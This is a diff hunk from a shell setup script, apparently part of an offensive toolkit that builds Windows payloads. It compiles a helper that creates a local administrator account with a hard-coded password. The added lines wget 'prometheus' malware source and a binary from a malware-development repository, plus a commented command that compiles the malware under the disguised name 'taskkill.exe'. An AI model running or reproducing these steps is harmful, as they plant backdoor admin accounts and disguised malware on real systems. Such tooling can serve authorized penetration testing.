@@ -258,7 +258,13 @@ i=system ("net user amxuser amxpass1234 /add & net localgroup administrators amx
 EOT
 i686-w64-mingw32-gcc -o useradd.exe -lws2_32 useradd.c
 
-# echo -e '#include <stdio.h>\n#include <smain () {\nsystem("net user brisksec brisksec /add & net localgroup administrators brisksec /add");\nreturn(0);\n}'> poc.c
+        # echo -e '#include <stdio.h>\n#include <smain () {\nsystem("net user brisksec brisksec /add & net localgroup administrators brisksec /add");\nreturn(0);\n}'> poc.c
+
+        wget -N https://raw.githubusercontent.com/paranoidninja/ScriptDotSh-MalwareDevelopment/master/prometheus.cpp
+        wget -N https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/raw/master/prometheus.exe
+        wget -N https://raw.githubusercontent.com/paranoidninja/ScriptDotSh-MalwareDevelopment/master/prometheus_v2.cpp
+        # apt-get install g++-mingw-w64
+        # i686-w64-mingw32-g++ prometheus.cpp -o taskkill.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
 
         # Create all common shells in payloads_windows folder
         bash ../../_setup/setup_payloads.sh
